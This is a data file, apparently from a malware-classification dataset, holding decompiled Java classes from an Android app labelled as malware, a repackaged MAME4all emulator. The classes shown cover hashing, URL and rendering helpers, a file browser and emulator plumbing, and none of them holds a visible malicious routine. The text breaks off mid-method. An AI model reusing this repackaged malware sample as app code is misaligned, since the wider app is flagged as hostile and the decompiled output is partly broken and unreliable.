"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\g.code","public class g {   public static final String a=System.getProperty(""line.separator"");   private static final String b=""helper"";   public static String a(  String str){     if (str == null) {       return null;     }     try {       byte[] bytes=str.getBytes();       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.reset();       messageDigest.update(bytes);       byte[] digest=messageDigest.digest();       StringBuffer stringBuffer=new StringBuffer();       for (      byte b2 : digest) {         stringBuffer.append(String.format(""%02X"",Byte.valueOf(b2)));       }       return stringBuffer.toString();     }  catch (    Exception e) {       return str.replaceAll(""[^[a-z][A-Z][0-9][.][_]]"","""");     }   }   public static String b(  String str){     try {       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.update(str.getBytes());       byte[] digest=messageDigest.digest();       StringBuffer stringBuffer=new StringBuffer();       for (      byte b2 : digest) {         stringBuffer.append(Integer.toHexString(b2 & 255));       }       return stringBuffer.toString();     }  catch (    NoSuchAlgorithmException e) {       Log.a(b,""getMD5 error"",e);       return """";     }   }   public static String a(  File file){     byte[] bArr=new byte[1024];     try {       if (!file.isFile()) {         return """";       }       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       FileInputStream fileInputStream=new FileInputStream(file);       while (true) {         int read=fileInputStream.read(bArr,0,1024);         if (read != -1) {           messageDigest.update(bArr,0,read);         }  else {           fileInputStream.close();           return String.format(""%1$032x"",new BigInteger(1,messageDigest.digest()));         }       }     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static String a(  Context context,  long j){     if (j < 1000) {       return ((int)j) + ""B"";     }     if (j < 1000000) {       return Math.round(((float)j) / 1000.0d) + ""K"";     }     if (j < 1000000000) {       return new DecimalFormat(""#0.0"").format(((float)j) / 1000000.0d) + ""M"";     }     return new DecimalFormat(""#0.00"").format(((float)j) / 1.0E9d) + ""G"";   }   public static String c(  String str){     try {       long longValue=Long.valueOf(str).longValue();       if (longValue < 1024) {         return ((int)longValue) + ""B"";       }       if (longValue < 1048576) {         return new DecimalFormat(""#0.00"").format(((float)longValue) / 1024.0d) + ""K"";       }       if (longValue < 1073741824) {         return new DecimalFormat(""#0.00"").format(((float)longValue) / 1048576.0d) + ""M"";       }       return new DecimalFormat(""#0.00"").format(((float)longValue) / 1.073741824E9d) + ""G"";     }  catch (    NumberFormatException e) {       return str;     }   }   public static void a(  Context context,  String str){     context.startActivity(context.getPackageManager().getLaunchIntentForPackage(str));   }   public static boolean b(  Context context,  String str){     try {       context.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));       return true;     }  catch (    Exception e) {       e.printStackTrace();       return false;     }   }   public static boolean d(  String str){     return str == null || str.length() == 0;   }   public static boolean e(  String str){     if (d(str)) {       return false;     }     String lowerCase=str.trim().toLowerCase();     return lowerCase.startsWith(""http://"") || lowerCase.startsWith(""https://"");   }   public static String a(){     return a(new Date());   }   public static String a(  Date date){     if (date == null) {       return """";     }     return new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(date);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\h.code","public class h {   public static String a(  Map<String,Object> map,  String str){     if (map != null && !map.isEmpty()) {       StringBuilder sb=new StringBuilder(str);       Set<String> keySet=map.keySet();       if (!str.endsWith(""?"")) {         sb.append(""?"");       }       for (      String str2 : keySet) {         sb.append(URLEncoder.encode(str2) + ""="" + URLEncoder.encode(map.get(str2) == null ? """" : map.get(str2).toString())+ ""&"");       }       sb.deleteCharAt(sb.length() - 1);       return sb.toString();     }     return str;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\i.code","public class i {   private static float a=1.0f;   public i(  Context context){     a(context);   }   public static void a(  Context context){     a=context.getResources().getDisplayMetrics().density;   }   public static int a(  float f){     return (int)((a * f) + 0.5f);   }   public static int b(  float f){     return (int)((f / a) + 0.5f);   }   public static int c(  float f){     return (int)((a * f) + 0.5f);   }   public static int d(  float f){     return (int)((f / a) + 0.5f);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\AnonymousClass1.code","class AnonymousClass1 implements DialogInterface.OnClickListener {   AnonymousClass1(){   }   @Override public void onClick(  DialogInterface dialog,  int which){     Intent intent=new Intent(MAME4all.this,(Class<?>)WelcomScreen.class);     MAME4all.this.startActivity(intent);     MAME4all.this.finish();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\AnonymousClass2.code","class AnonymousClass2 implements DialogInterface.OnClickListener {   AnonymousClass2(){   }   @Override public void onClick(  DialogInterface dialog,  int which){     MAME4all.this.finish();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\attr.code","public static final class attr { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\BuildConfig.code","public final class BuildConfig {   public static final boolean DEBUG=true; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\color.code","public static final class color {   public static final int black=0x7f050002;   public static final int emu_back_color=0x7f050000;   public static final int grey=0x7f050003;   public static final int red=0x7f050004;   public static final int white=0x7f050001; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\drawable.code","public static final class drawable {   public static final int back_portrait=0x7f020000;   public static final int bg=0x7f020001;   public static final int black=0x7f02003c;   public static final int border=0x7f020002;   public static final int btn1=0x7f020003;   public static final int btn2=0x7f020004;   public static final int btn3=0x7f020005;   public static final int btn_01=0x7f020006;   public static final int btn_02=0x7f020007;   public static final int btn_03=0x7f020008;   public static final int btn_1=0x7f020009;   public static final int btn_2=0x7f02000a;   public static final int btn_3=0x7f02000b;   public static final int button_a=0x7f02000c;   public static final int button_a_press=0x7f02000d;   public static final int button_b=0x7f02000e;   public static final int button_b_press=0x7f02000f;   public static final int button_l1=0x7f020010;   public static final int button_l1_press=0x7f020011;   public static final int button_l2=0x7f020012;   public static final int button_l2_press=0x7f020013;   public static final int button_r1=0x7f020014;   public static final int button_r1_press=0x7f020015;   public static final int button_r2=0x7f020016;   public static final int button_r2_press=0x7f020017;   public static final int button_select=0x7f020018;   public static final int button_select_press=0x7f020019;   public static final int button_start=0x7f02001a;   public static final int button_start_press=0x7f02001b;   public static final int button_x=0x7f02001c;   public static final int button_x_press=0x7f02001d;   public static final int button_y=0x7f02001e;   public static final int button_y_press=0x7f02001f;   public static final int crt_1=0x7f020020;   public static final int crt_2=0x7f020021;   public static final int directory_icon=0x7f020022;   public static final int directory_up=0x7f020023;   public static final int dpad_down=0x7f020024;   public static final int dpad_down_left=0x7f020025;   public static final int dpad_down_right=0x7f020026;   public static final int dpad_left=0x7f020027;   public static final int dpad_none=0x7f020028;   public static final int dpad_right=0x7f020029;   public static final int dpad_up=0x7f02002a;   public static final int dpad_up_left=0x7f02002b;   public static final int dpad_up_right=0x7f02002c;   public static final int file_icon=0x7f02002d;   public static final int icon=0x7f02002e;   public static final int scanline_1=0x7f02002f;   public static final int scanline_2=0x7f020030;   public static final int stick_down=0x7f020031;   public static final int stick_down_left=0x7f020032;   public static final int stick_down_right=0x7f020033;   public static final int stick_inner=0x7f020034;   public static final int stick_left=0x7f020035;   public static final int stick_none=0x7f020036;   public static final int stick_outer=0x7f020037;   public static final int stick_right=0x7f020038;   public static final int stick_up=0x7f020039;   public static final int stick_up_left=0x7f02003a;   public static final int stick_up_right=0x7f02003b;   public static final int translucent=0x7f02003d;   public static final int transparent=0x7f02003e; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\Emulator.code","public class Emulator {   public static final int ASMCORES_KEY=7;   public static final int BPLUSX_KEY=5;   public static final int EXIT_GAME_KEY=2;   public static final int EXIT_PAUSE=9;   public static final int FPS_SHOWED_KEY=1;   public static final int HIDE_LR__KEY=4;   public static final int IDLE_WAIT=10;   public static final int INFOWARN_KEY=8;   public static final int LAND_BUTTONS_KEY=3;   public static final int WAYS_STICK_KEY=6;   static long millis;   private static MAME4all mm=null;   private static boolean isEmulating=false;   private static boolean paused=false;   private static Object lock1=new Object();   private static Object lock2=new Object();   private static SurfaceHolder holder=null;   private static Bitmap emuBitmap=Bitmap.createBitmap(320,240,Bitmap.Config.RGB_565);   private static ByteBuffer screenBuff=null;   private static int[] screenBuffPx=new int[921600];   private static boolean frameFiltering=false;   private static Paint emuPaint=null;   private static Paint debugPaint=new Paint();   private static Matrix mtx=new Matrix();   private static int window_width=320;   private static int window_height=240;   private static int emu_width=320;   private static int emu_height=240;   private static AudioTrack audioTrack=null;   private static boolean isThreadedSound=false;   private static boolean isDebug=false;   private static int videoRenderMode=2;   private static boolean inMAME=false;   private static int overlayFilterType=1;   static long j=0;   static int i=0;   static int fps=0;   private static SoundThread soundT=new SoundThread();   private static VideoThread videoT=new VideoThread();   public static native int getValue(  int i2);   protected static native void init(  String str,  String str2);   public static native synchronized void setAnalogData(  int i2,  float f,  float f2);   public static native synchronized void setPadData(  int i2,  long j2);   public static native void setValue(  int i2,  int i3); static {     try {       System.loadLibrary(""mame4all-jni"");     }  catch (    Error e) {       e.printStackTrace();     }     debugPaint.setARGB(MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK);     debugPaint.setStyle(Paint.Style.STROKE);     debugPaint.setTextSize(16.0f);   }   public static boolean isEmulating(){     return isEmulating;   }   public static int[] getScreenBuffPx(){     return screenBuffPx;   }   public static boolean isFrameFiltering(){     return frameFiltering;   }   public static int getWindow_width(){     return window_width;   }   public static int getWindow_height(){     return window_height;   }   public static boolean isInMAME(){     return inMAME;   }   public static int getOverlayFilterType(){     return overlayFilterType;   }   public static void setOverlayFilterType(  int overlayFilterType2){     overlayFilterType=overlayFilterType2;   }   public static int getEmulatedWidth(){     return emu_width;   }   public static int getEmulatedHeight(){     return emu_height;   }   public static boolean isThreadedSound(){     return isThreadedSound;   }   public static void setThreadedSound(  boolean isThreadedSound2){     isThreadedSound=isThreadedSound2;   }   public static boolean isDebug(){     return isDebug;   }   public static void setDebug(  boolean isDebug2){     isDebug=isDebug2;   }   public static int getVideoRenderMode(){     return videoRenderMode;   }   public static void setVideoRenderMode(  int videoRenderMode2){     videoRenderMode=videoRenderMode2;   }   public static Paint getEmuPaint(){     return emuPaint;   }   public static Paint getDebugPaint(){     return debugPaint;   }   public static Matrix getMatrix(){     return mtx;   }   public static SurfaceHolder getHolder(){     return holder;   }   public static Bitmap getEmuBitmap(){     return emuBitmap;   }   public static ByteBuffer getScreenBuffer(){     return screenBuff;   }   public static void setHolder(  SurfaceHolder value){ synchronized (lock1) {       if (value != null) {         holder=value;         holder.setFormat(-1);         holder.setKeepScreenOn(true);         videoT.start();       }  else {         videoT.stop();         holder=null;       }     }   }   public static Canvas lockCanvas(){     if (holder != null) {       return holder.lockCanvas();     }     return null;   }   public static void unlockCanvas(  Canvas c2){     if (holder != null && c2 != null) {       holder.unlockCanvasAndPost(c2);     }   }   public static void setMAME4all(  MAME4all mm2){     mm=mm2;     videoT.setMAME4all(mm2);   }   public static void setWindowSize(  int w,  int h){     window_width=w;     window_height=h;     if (videoRenderMode != 3) {       mtx.setScale(window_width / emu_width,window_height / emu_height);     }   }   public static void setFrameFiltering(  boolean value){     frameFiltering=value;     if (value) {       emuPaint=new Paint();       emuPaint.setFilterBitmap(true);     }  else {       emuPaint=null;     }   }   static void bitblt(  ByteBuffer sScreenBuff,  boolean inMAME2){     if (paused) { synchronized (lock2) {         try {           if (paused) {             lock2.wait();           }         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }     } synchronized (lock1) {       screenBuff=sScreenBuff;       inMAME=inMAME2;       if (videoRenderMode == 3) {         ((EmulatorViewGL)mm.getEmuView()).requestRender();       }  else       if (videoRenderMode == 2) {         videoT.update();       }  else       if (videoRenderMode == 4) {         videoT.update();       }  else       if (holder != null) {         Canvas canvas=holder.lockCanvas();         sScreenBuff.rewind();         emuBitmap.copyPixelsFromBuffer(sScreenBuff);         i++;         canvas.concat(mtx);         canvas.drawBitmap(emuBitmap,0.0f,0.0f,emuPaint);         if (isDebug) {           canvas.drawText(""Normal fps:"" + fps + "" ""+ inMAME2,5.0f,40.0f,debugPaint);           if (System.currentTimeMillis() - millis >= 1000) {             fps=i;             i=0;             millis=System.currentTimeMillis();           }         }         holder.unlockCanvasAndPost(canvas);       }     }   }   public static void changeVideo(  int newWidth,  int newHeight){     GLRenderer r; synchronized (lock1) {       for (int i2=0; i2 < 4; i2++) {         setPadData(i2,0L);       }       emu_width=newWidth;       emu_height=newHeight;       emuBitmap=Bitmap.createBitmap(newWidth,newHeight,Bitmap.Config.RGB_565);       mtx.setScale(window_width / emu_width,window_height / emu_height);       if (videoRenderMode == 3 && (r=(GLRenderer)((EmulatorViewGL)mm.getEmuView()).getRender()) != null) {         r.changedEmulatedSize();       }       mm.runOnUiThread(new Runnable(){         @Override public void run(){           Emulator.mm.getMainHelper().updateMAME4all();         }       } );     }   }   public static void initAudio(  int freq,  boolean stereo){     int channelConfig=stereo ? 3 : 2;     int bufferSize=AudioTrack.getMinBufferSize(freq,channelConfig,2) * 2;     audioTrack=new AudioTrack(3,freq,channelConfig,2,bufferSize,1);     audioTrack.play();   }   public static void endAudio(){     audioTrack.stop();     audioTrack.release();     audioTrack=null;   }   public static void writeAudio(  byte[] b,  int sz){     if (audioTrack != null) {       if (isThreadedSound && soundT != null) {         soundT.setAudioTrack(audioTrack);         soundT.writeSample(b,sz);       }  else {         audioTrack.write(b,0,sz);       }     }   }   public static void pause(){     if (isEmulating) {       paused=true;     }     if (audioTrack != null) {       audioTrack.pause();     }     videoT.stop();   }   public static void resume(){     if (audioTrack != null) {       audioTrack.play();     }     if (isEmulating) {       setValue(9,1); synchronized (lock2) {         paused=false;         lock2.notify();       }     }     videoT.start();   }   public static void emulate(  final String libPath,  final String resPath){     if (!isEmulating) {       Thread t=new Thread(new Runnable(){         @Override public void run(){           Emulator.isEmulating=true;           Emulator.init(libPath,resPath);         }       } ,""emulator-Thread"");       t.start();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\FileExplorer.code","public class FileExplorer {   private static final String TAG=""FE_PATH"";   ListAdapter adapter;   private String chosenFile;   private Item[] fileList;   protected MAME4all mm;   ArrayList<String> traversed=new ArrayList<>();   private Boolean firstLvl=true;   private File path=new File(""/"");   public File getPath(){     return this.path;   }   public FileExplorer(  MAME4all mm){     this.mm=null;     this.mm=mm;   }   private void loadFileList(){     if (this.path.exists()) {       FilenameFilter filter=new FilenameFilter(){         @Override public boolean accept(        File dir,        String filename){           File sel=new File(dir,filename);           return sel.isDirectory() && !sel.isHidden();         }       } ;       String[] fList=this.path.list(filter);       if (fList == null) {         fList=new String[0];       }       this.fileList=new Item[fList.length];       for (int i=0; i < fList.length; i++) {         this.fileList[i]=new Item(fList[i],Integer.valueOf(com.mygame.ywbzhsi.R.drawable.file_icon));         File sel=new File(this.path,fList[i]);         if (sel.isDirectory()) {           this.fileList[i].icon=com.mygame.ywbzhsi.R.drawable.directory_icon;           Log.d(""DIRECTORY"",this.fileList[i].file);         }  else {           Log.d(""FILE"",this.fileList[i].file);         }       }       if (!this.firstLvl.booleanValue()) {         Item[] temp=new Item[this.fileList.length + 1];         for (int i2=0; i2 < this.fileList.length; i2++) {           temp[i2 + 1]=this.fileList[i2];         }         temp[0]=new Item(""Up"",Integer.valueOf(com.mygame.ywbzhsi.R.drawable.directory_up));         this.fileList=temp;       }     }  else {       Log.e(TAG,""path does not exist"");     }     this.adapter=new ArrayAdapter<Item>(this.mm,android.R.layout.select_dialog_item,android.R.id.text1,this.fileList){       @Override public View getView(      int position,      View convertView,      ViewGroup parent){         View view=super.getView(position,convertView,parent);         TextView textView=(TextView)view.findViewById(android.R.id.text1);         textView.setCompoundDrawablesWithIntrinsicBounds(FileExplorer.this.fileList[position].icon,0,0,0);         int dp5=(int)((5.0f * FileExplorer.this.mm.getResources().getDisplayMetrics().density) + 0.5f);         textView.setCompoundDrawablePadding(dp5);         return view;       }     } ;   } public class Item {     public String file;     public int icon;     public Item(    String file,    Integer icon){       this.file=file;       this.icon=icon.intValue();     }     public String toString(){       return this.file;     }   }   public Dialog create(){     loadFileList();     AlertDialog.Builder builder=new AlertDialog.Builder(this.mm);     if (this.fileList == null) {       Log.e(TAG,""No files loaded"");       Dialog dialog=builder.create();       return dialog;     }     builder.setTitle(""Selected: "" + this.path.getPath());     builder.setAdapter(this.adapter,new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog2,      int which){         FileExplorer.this.chosenFile=FileExplorer.this.fileList[which].file;         File sel=new File(FileExplorer.this.path + ""/"" + FileExplorer.this.chosenFile);         if (sel.isDirectory()) {           FileExplorer.this.firstLvl=false;           FileExplorer.this.traversed.add(FileExplorer.this.chosenFile);           FileExplorer.this.fileList=null;           FileExplorer.this.path=new File(new StringBuilder().append(sel).toString());           FileExplorer.this.mm.removeDialog(8);           FileExplorer.this.mm.showDialog(8);           Log.d(FileExplorer.TAG,FileExplorer.this.path.getAbsolutePath());           return;         }         if (FileExplorer.this.chosenFile.equalsIgnoreCase(""up"") && !sel.exists()) {           String s=FileExplorer.this.traversed.remove(FileExplorer.this.traversed.size() - 1);           FileExplorer.this.path=new File(FileExplorer.this.path.toString().substring(0,FileExplorer.this.path.toString().lastIndexOf(s)));           FileExplorer.this.fileList=null;           if (FileExplorer.this.traversed.isEmpty()) {             FileExplorer.this.firstLvl=true;           }           FileExplorer.this.mm.removeDialog(8);           FileExplorer.this.mm.showDialog(8);           Log.d(FileExplorer.TAG,FileExplorer.this.path.getAbsolutePath());         }       }     } );     builder.setPositiveButton(""Done"",new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog2,      int id){         String res_dir=null;         try {           res_dir=String.valueOf(FileExplorer.this.path.getCanonicalPath()) + ""/MAME4all/"";         }  catch (        IOException e) {           e.printStackTrace();         }         if (res_dir.startsWith(""//"")) {           res_dir=res_dir.substring(1);         }         DialogHelper.savedDialog=-1;         FileExplorer.this.mm.removeDialog(8);         if (FileExplorer.this.mm.getMainHelper().ensureROMsDir(res_dir)) {           FileExplorer.this.mm.getPrefsHelper().setROMsDIR(res_dir);           FileExplorer.this.mm.runMAME4all();         }       }     } );     builder.setCancelable(false);     Dialog dialog2=builder.show();     return dialog2;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\GLRenderer.code","public class GLRenderer implements GLSurfaceView.Renderer {   private FloatBuffer mFVertexBuffer;   private ShortBuffer mIndexBuffer;   private FloatBuffer mTexBuffer;   protected int mTex=-1;   protected int[] mtexBuf=new int[1];   protected ShortBuffer shortBuffer=null;   protected boolean textureInit=false;   protected boolean force10=false;   protected boolean smooth=false;   protected MAME4all mm=null;   private final int[] mTextureName=new int[1];   private final int[] mCrop=new int[4];   public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public void changedEmulatedSize(){     Log.v(""mm"",""changedEmulatedSize "" + this.shortBuffer + "" ""+ Emulator.getScreenBuffer());     if (Emulator.getScreenBuffer() != null) {       this.shortBuffer=Emulator.getScreenBuffer().asShortBuffer();       this.textureInit=false;     }   }   @Override public void onSurfaceCreated(  GL10 gl,  EGLConfig config){     Log.v(""mm"",""onSurfaceCreated "");     gl.glHint(3152,4353);     gl.glClearColor(0.5f,0.5f,0.5f,1.0f);     gl.glClear(16640);     gl.glShadeModel(7424);     gl.glEnable(3553);     gl.glDisable(3024);     gl.glDisable(2896);     gl.glDisable(3042);     gl.glDisable(2884);     gl.glDisable(2929);     gl.glDisable(32925);     if (!(gl instanceof GL11Ext) || this.force10) {       gl.glEnableClientState(32884);       gl.glEnableClientState(32888);     }     this.textureInit=false;   }   @Override public void onSurfaceChanged(  GL10 gl,  int w,  int h){     Log.v(""mm"",""sizeChanged: ==> new Viewport: ["" + w + "",""+ h+ ""]"");     gl.glViewport(0,0,w,h);     gl.glMatrixMode(5889);     gl.glLoadIdentity();     gl.glOrthof(0.0f,w,h,0.0f,-1.0f,1.0f);     gl.glFrontFace(2305);     gl.glClearColor(0.5f,0.5f,0.5f,1.0f);     gl.glClear(16640);     this.textureInit=false;   }   protected boolean isSmooth(){     return Emulator.isFrameFiltering();   }   protected int loadTexture(  GL10 gl){     int textureName=-1;     if (gl != null) {       gl.glGenTextures(1,this.mTextureName,0);       textureName=this.mTextureName[0];       gl.glBindTexture(3553,textureName);       this.smooth=isSmooth();       gl.glTexParameterf(3553,10241,9728.0f);       gl.glTexParameterf(3553,10240,this.smooth ? 9729 : 9728);       gl.glTexParameterf(3553,10242,33071.0f);       gl.glTexParameterf(3553,10243,33071.0f);       gl.glTexEnvf(8960,8704,7681.0f);       int error=gl.glGetError();       if (error != 0) {         Log.e(""SpriteMethodTest"",""Texture Load GLError: "" + error);       }     }     return textureName;   }   public void initVertexes(  GL10 gl){     if (!(gl instanceof GL11Ext) || this.force10) {       int width=Emulator.getEmulatedWidth();       int height=Emulator.getEmulatedHeight();       ByteBuffer vbb=ByteBuffer.allocateDirect(48);       vbb.order(ByteOrder.nativeOrder());       this.mFVertexBuffer=vbb.asFloatBuffer();       ByteBuffer tbb=ByteBuffer.allocateDirect(32);       tbb.order(ByteOrder.nativeOrder());       this.mTexBuffer=tbb.asFloatBuffer();       ByteBuffer ibb=ByteBuffer.allocateDirect(8);       ibb.order(ByteOrder.nativeOrder());       this.mIndexBuffer=ibb.asShortBuffer();       float scaleX=Emulator.getWindow_width() / Emulator.getEmulatedWidth();       float scaleY=Emulator.getWindow_height() / Emulator.getEmulatedHeight();       float[] coords={(int)(width * scaleX),0.0f,0.0f,(int)(width * scaleX),(int)(height * scaleY),0.0f,0.0f,0.0f,0.0f,0.0f,(int)(height * scaleY),0.0f};       int width_p2=Emulator.getEmulatedWidth() > 512 ? 1024 : 512;       float[] texturCoords={1.0f / (width_p2 / width),0.0f,0.0f,1.0f / (width_p2 / width),1.0f / (512 / height),0.0f,0.0f,0.0f,0.0f,0.0f,1.0f / (512 / height),0.0f};       for (int i=0; i < 4; i++) {         for (int j=0; j < 3; j++) {           this.mFVertexBuffer.put(coords[(i * 3) + j]);         }       }       for (int i2=0; i2 < 4; i2++) {         for (int j2=0; j2 < 2; j2++) {           this.mTexBuffer.put(texturCoords[(i2 * 3) + j2]);         }       }       for (int i3=0; i3 < 4; i3++) {         this.mIndexBuffer.put((short)i3);       }       this.mFVertexBuffer.position(0);       this.mTexBuffer.position(0);       this.mIndexBuffer.position(0);     }   }   private void releaseTexture(  GL10 gl){     if (this.mTex != -1) {       gl.glDeleteTextures(1,new int[]{this.mTex},0);     }   }   public void dispose(  GL10 gl){     releaseTexture(gl);   }   @Override public void onDrawFrame(  GL10 gl){     if (this.shortBuffer == null) {       ByteBuffer buf=Emulator.getScreenBuffer();       if (buf != null) {         this.shortBuffer=buf.asShortBuffer();       }  else {         return;       }     }     if (this.mTex == -1 || this.smooth != isSmooth()) {       this.mTex=loadTexture(gl);     }     gl.glActiveTexture(this.mTex);     gl.glClientActiveTexture(this.mTex);     this.shortBuffer.rewind();     gl.glBindTexture(3553,this.mTex);     if (!this.textureInit) {       initVertexes(gl);       gl.glTexImage2D(3553,0,6407,Emulator.getEmulatedWidth() > 512 ? 1024 : 512,512,0,6407,33635,this.shortBuffer);       this.textureInit=true;     }     int width=Emulator.getEmulatedWidth();     int height=Emulator.getEmulatedHeight();     gl.glTexSubImage2D(3553,0,0,0,width,height,6407,33635,this.shortBuffer);     if ((gl instanceof GL11Ext) && !this.force10) {       this.mCrop[0]=0;       this.mCrop[1]=height;       this.mCrop[2]=width;       this.mCrop[3]=-height;       ((GL11)gl).glTexParameteriv(3553,35741,this.mCrop,0);       ((GL11Ext)gl).glDrawTexiOES(0,0,0,Emulator.getWindow_width(),Emulator.getWindow_height());       return;     }     gl.glVertexPointer(3,5126,0,this.mFVertexBuffer);     gl.glTexCoordPointer(2,5126,0,this.mTexBuffer);     gl.glDrawElements(5,4,5123,this.mIndexBuffer);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\HelpActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@30651b6b"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\id.code","public static final class id {   public static final int ButtonContinue=0x7f080009;   public static final int EmulatorFrame=0x7f08000b;   public static final int EmulatorViewGL=0x7f080002;   public static final int EmulatorViewHW=0x7f080003;   public static final int EmulatorViewSW=0x7f080004;   public static final int FilterView=0x7f080005;   public static final int InputView=0x7f08000c;   public static final int LinearLayout01=0x7f080006;   public static final int ScrollView01=0x7f080007;   public static final int TextView01=0x7f080008;   public static final int ad_container=0x7f08000a;   public static final int seekbar=0x7f080001;   public static final int value=0x7f080000; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\Item.code","public class Item {   public String file;   public int icon;   public Item(  String file,  Integer icon){     this.file=file;     this.icon=icon.intValue();   }   public String toString(){     return this.file;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\layout.code","public static final class layout {   public static final int bar=0x7f030000;   public static final int emuview_gl=0x7f030001;   public static final int emuview_hw=0x7f030002;   public static final int emuview_sw=0x7f030003;   public static final int filterview=0x7f030004;   public static final int help=0x7f030005;   public static final int home=0x7f030006;   public static final int main=0x7f030007; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.mame4all\MAME4all.code","public class MAME4all extends Activity implements Runnable {   private Handler timer;   protected View emuView=null;   protected InputView inputView=null;   protected FilterView filterView=null;   protected MainHelper mainHelper=null;   protected PrefsHelper prefsHelper=null;   protected DialogHelper dialogHelper=null;   protected InputHandler inputHandler=null;   protected FileExplorer fileExplore=null;   @Override public void run(){   }   public FileExplorer getFileExplore(){     return this.fileExplore;   }   public PrefsHelper getPrefsHelper(){     return this.prefsHelper;   }   public MainHelper getMainHelper(){     return this.mainHelper;   }   public DialogHelper getDialogHelper(){     return this.dialogHelper;   }   public View getEmuView(){     return this.emuView;   }   public InputView getInputView(){     return this.inputView;   }   public FilterView getFilterView(){     return this.filterView;   }   public InputHandler getInputHandler(){     return this.inputHandler;   }   @Override public void onCreate(  Bundle savedInstanceState){     int type;     super.onCreate(savedInstanceState);     this.timer=new Handler();     this.timer.postDelayed(this,240000L);     setContentView(com.mygame.ywbzhsi.R.layout.main);     this.prefsHelper=new PrefsHelper(this);     this.dialogHelper=new DialogHelper(this);     this.mainHelper=new MainHelper(this);     this.fileExplore=new FileExplorer(this);     this.inputHandler=InputHandlerFactory.createInputHandler(this);     FrameLayout fl=(FrameLayout)findViewById(com.mygame.ywbzhsi.R.id.EmulatorFrame);     if (this.prefsHelper.getVideoRenderMode() == 3) {       getLayoutInflater().inflate(com.mygame.ywbzhsi.R.layout.emuview_gl,fl);       this.emuView=findViewById(com.mygame.ywbzhsi.R.id.EmulatorViewGL);     }  else     if (this.prefsHelper.getVideoRenderMode() == 4) {       getLayoutInflater().inflate(com.mygame.ywbzhsi.R.layout.emuview_hw,fl);       this.emuView=findViewById(com.mygame.ywbzhsi.R.id.EmulatorViewHW);     }  else {       getLayoutInflater().inflate(com.mygame.ywbzhsi.R.layout.emuview_sw,fl);       this.emuView=findViewById(com.mygame.ywbzhsi.R.id.EmulatorViewSW);     }     this.inputView=(InputView)findViewById(com.mygame.ywbzhsi.R.id.InputView);     ((IEmuView)this.emuView).setMAME4all(this);     this.inputView.setMAME4all(this);     Emulator.setMAME4all(this);     View frame=findViewById(com.mygame.ywbzhsi.R.id.EmulatorFrame);     frame.setOnTouchListener(this.inputHandler);     if ((this.prefsHelper.getPortraitOverlayFilterType() != 1 && this.mainHelper.getscrOrientation() == 1) || (this.prefsHelper.getLandscapeOverlayFilterType() != 1 && this.mainHelper.getscrOrientation() == 2)) {       if (this.mainHelper.getscrOrientation() == 1) {         type=this.prefsHelper.getPortraitOverlayFilterType();       }  else {         type=this.prefsHelper.getLandscapeOverlayFilterType();       }       int dwb_id=-1; switch (type) { case 2: case 3:         dwb_id=com.mygame.ywbzhsi.R.drawable.scanline_1;       break; case 4: case 5:     dwb_id=com.mygame.ywbzhsi.R.drawable.scanline_2;   break; case 6: case 7: dwb_id=com.mygame.ywbzhsi.R.drawable.crt_1; break; case 8: case 9: dwb_id=com.mygame.ywbzhsi.R.drawable.crt_2; break; } if (dwb_id != -1) { getLayoutInflater().inflate(com.mygame.ywbzhsi.R.layout.filterview,fl); 